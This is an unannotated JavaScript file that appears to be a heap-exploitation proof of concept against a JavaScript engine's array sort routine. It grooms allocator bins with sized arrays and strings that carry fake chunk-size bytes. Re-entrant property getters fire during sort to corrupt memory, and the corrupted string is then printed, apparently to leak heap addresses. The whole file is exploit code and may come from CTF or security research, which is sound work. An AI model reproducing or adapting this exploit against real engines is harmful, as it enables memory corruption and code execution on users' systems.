var a=[];
var consolidatable = [];
function consolidate() {consolidatable.length = 0x10000 / 32; consolidatable.sort();}
var largebin = [];
var fastbin = [];
function make_largebin() {consolidate(); largebin.length = 0x10000 / 32;for(var i = 0; i < 100; i++) largebin[i] = 1; fastbin.length=2;Object.defineProperty(largebin,'0',{get:function(){print('!');fastbin.sort()},set:function(){}});largebin.sort();}
var z=[],y,x;
a.length=(1<<27)+3;
function make_string(x) { var i = 1, a = 'a'; while(i < x){a += a; i *= 2;}; return a.substring(0, x); };
for(var i = 0; i < 5; i++) a[i]='aaaa\x00\x10\x00\x00'.trim();

a[3]='abcdefgh\x71\x00'.trim(); // preserve next chunk size as 0x71

make_largebin();
var c = make_string(0x30);
var fill = make_string(0x10000);
var i;
var b = 0;
Object.defineProperty(a,'0', {get:function(){
	if(!b) {
		b=1;
		consolidate();
		for(var i = 0; i < 100; i++) largebin[i] = new Array();
		a.sort();
		throw 1;
	}
	z = String('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
	c = String(z);
	c+c;
	c = new String();
	return 1;
}, set: function() {}});1
var heap_base;
var i, j, cc;
Object.defineProperty(a,'80', {get:function(){
	print(z);
	throw 1;
}});1
for(i = 0 ; i < 8; i++) z.push(new Array());
consolidate();
a.sort();1;
print('hey');